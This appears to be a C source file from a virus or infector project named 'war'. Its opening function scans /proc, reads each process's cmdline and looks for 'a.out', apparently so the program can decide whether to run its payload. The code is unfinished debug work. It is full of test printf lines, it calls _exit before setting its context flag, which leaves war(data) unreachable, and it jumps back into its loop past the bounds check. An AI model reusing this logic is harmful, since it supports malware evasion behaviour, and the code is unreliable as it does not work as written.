#include "war.h"

__INLINE__ bool	check_name(char *str, int len)
{
	for (register int i = 0 ; i < len ; i++)
	{
		if (str[i] < '0' || str[i] > '9')
			return (false);
	}
	return (true);
}

void	opening(t_data *data)
{
	int		fd[3];
	int		limit;
	char	buf[BUFF_SIZE] = {0};
	char	target[9] = "/cmdline";
	char	path[PATH_MAX] = "/proc/\0";
	char	proc[PATH_MAX] = {0};

	linux_dirent64 *curr = NULL;

	char de[] = "opening\n";
	_write(1, de, _strlen(de));

	data->context = false;
	if ((fd[0] = _open(path, O_RDONLY, 0000)) < 0)
	{
		printf("test1\n");
		goto ERR;
	}

	while ((limit = _getdents64(fd[0], (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		int		len;
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{

		BEGIN:
			curr = (struct linux_dirent64 *)(buf + i);
			len = _strlen(curr->d_name);
			if (check_name(curr->d_name, len) == true)
			{
				printf("[%s] -> %d\n", curr->d_name, len);
				// path = "/proc/$pid"
				if (_memcpy(path + 6, curr->d_name, len) != path + 6)
				{
					printf("\ttest2\n");
					goto ERR;
				}

				if (access(path, F_OK) != 0)
					goto ERR;
				if (access(path, R_OK) != 0)
				{
					i += curr->d_reclen;
					goto BEGIN;
				}

				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
				{
					printf("\ttest3\n");
					_close(fd[0]);
					goto ERR;
				}

				// path = "/proc/$pid/cmdline"
				if (_memcpy(path + (6 + len), target, 9) != path + (6 + len))
				{
					printf("\ttest4\n");
					goto ERR;
				}
				printf("\tpath = %s\n", path);

				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
				{
					printf("\ttest5\n");
					_close(fd[1]);
					goto ERR;
				}
				_read(fd[2], proc, PATH_MAX);
				if (_strlen(proc) > 0)
				{
					printf("\tread = %s\n", proc);
					if (_strncmp(proc, "a.out", _strlen(proc)) == 0)
					{
						_close(fd[1]);
						_close(fd[2]);
						printf("A.OUT FOUND\n");
						data->context = false;
						// close
						goto ERR;
					}
				}
				_close(fd[2]);
				_close(fd[1]);
			}
			printf("\n");
		}
	}
	if (_close(fd[0]) < 0)
		goto ERR;
	printf("NOT FOUND\n");
	_exit(1);
	data->context = true;

ERR:
	_exit(1);
	war(data);
}
